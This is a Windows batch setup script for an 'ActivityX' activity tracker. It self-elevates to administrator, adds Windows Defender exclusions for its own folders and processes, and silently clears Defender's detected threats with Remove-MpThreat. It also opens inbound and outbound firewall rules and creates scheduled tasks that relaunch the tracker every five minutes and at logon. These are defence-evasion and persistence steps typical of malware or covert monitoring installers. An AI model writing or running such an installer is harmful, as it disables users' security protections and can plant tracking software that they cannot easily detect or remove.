@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: ── Auto-elevate to Administrator ────────────────────────────────────────────
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs -ArgumentList '%~dp0'"
    exit /b
)

echo ========================================
echo    ActivityX Setup
echo ========================================
echo.

set "INSTALL_DIR=%LOCALAPPDATA%\ActivityX"
:: When elevated, %~dp0 may change — accept it as argument if passed
if not "%~1"=="" set "SETUP_DIR=%~1"
if "%~1"=="" set "SETUP_DIR=%~dp0"

:: ── Kill running instances first ─────────────────────────────────────────────
echo Stopping running instances...
taskkill /F /IM activity_tracker.exe >nul 2>&1
taskkill /F /IM activity_tracker_controller.exe >nul 2>&1
taskkill /F /IM monitor.exe >nul 2>&1
timeout /t 2 /nobreak >nul

echo Creating installation directory...
if not exist "!INSTALL_DIR!" mkdir "!INSTALL_DIR!"

:: ── Unblock downloaded files ────────────────────────────────────────────────
echo Unblocking downloaded files...
powershell -ExecutionPolicy Bypass -Command "Get-ChildItem '!SETUP_DIR!' -Recurse | Unblock-File" >nul 2>&1

echo Copying files...
copy /Y "!SETUP_DIR!activity_tracker.exe"            "!INSTALL_DIR!\" >nul
copy /Y "!SETUP_DIR!activity_tracker_controller.exe" "!INSTALL_DIR!\" >nul
if exist "!SETUP_DIR!version.txt" copy /Y "!SETUP_DIR!version.txt" "!INSTALL_DIR!\" >nul
copy /Y "!SETUP_DIR!config.py" "!INSTALL_DIR!\" >nul

if not exist "!INSTALL_DIR!\activity_tracker.exe" (
    echo ERROR: Failed to copy files.
    pause
    exit /b 1
)

:: ── Unblock installed files ────────────────────────────────────────────────
echo Unblocking installed files...
powershell -ExecutionPolicy Bypass -Command "Get-ChildItem '!INSTALL_DIR!' -Recurse | Unblock-File" >nul 2>&1

:: ── Windows Defender exclusion ───────────────────────────────────────────────
echo Configuring Windows Defender...
powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '!INSTALL_DIR!'; Add-MpPreference -ExclusionPath '!SETUP_DIR!'; Add-MpPreference -ExclusionProcess 'activity_tracker.exe'; Add-MpPreference -ExclusionProcess 'activity_tracker_controller.exe'" >nul 2>&1
powershell -ExecutionPolicy Bypass -Command "Remove-MpThreat -ErrorAction SilentlyContinue" >nul 2>&1

:: ── Firewall rules ──────────────────────────────────────────────────────────
echo Adding firewall rules...
netsh advfirewall firewall delete rule name="ActivityX Tracker" >nul 2>&1
netsh advfirewall firewall delete rule name="ActivityX Controller" >nul 2>&1
netsh advfirewall firewall add rule name="ActivityX Tracker" dir=out action=allow program="!INSTALL_DIR!\activity_tracker.exe" >nul 2>&1
netsh advfirewall firewall add rule name="ActivityX Tracker" dir=in action=allow program="!INSTALL_DIR!\activity_tracker.exe" >nul 2>&1
netsh advfirewall firewall add rule name="ActivityX Controller" dir=out action=allow program="!INSTALL_DIR!\activity_tracker_controller.exe" >nul 2>&1
netsh advfirewall firewall add rule name="ActivityX Controller" dir=in action=allow program="!INSTALL_DIR!\activity_tracker_controller.exe" >nul 2>&1

:: ── Scheduled tasks (replaces startup shortcuts) ────────────────────────────
echo Creating scheduled tasks...
schtasks /Delete /TN "ActivityX Controller" /F >nul 2>&1
schtasks /Create /TN "ActivityX Controller" /TR "\"!INSTALL_DIR!\activity_tracker_controller.exe\"" /SC MINUTE /MO 5 /F >nul 2>&1
schtasks /Delete /TN "ActivityX Controller Startup" /F >nul 2>&1
schtasks /Create /TN "ActivityX Controller Startup" /TR "\"!INSTALL_DIR!\activity_tracker_controller.exe\"" /SC ONLOGON /F >nul 2>&1

:: ── Remove old startup shortcuts (if any) ───────────────────────────────────
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
del "!STARTUP!\ActivityXTracker.lnk" >nul 2>&1
del "!STARTUP!\ActivityXController.lnk" >nul 2>&1
del "!STARTUP!\ActivityTracker.lnk" >nul 2>&1
del "!STARTUP!\ActivityTrackerController.lnk" >nul 2>&1

:: ── Start controller only (it will start the tracker) ───────────────────────
echo Starting controller...
pushd "!INSTALL_DIR!"
start "" "activity_tracker_controller.exe"
popd

echo.
echo ========================================
echo    Installation complete!
echo ========================================
echo Installed to: !INSTALL_DIR!
echo The tracker will start automatically on every Windows login.
echo.
pause
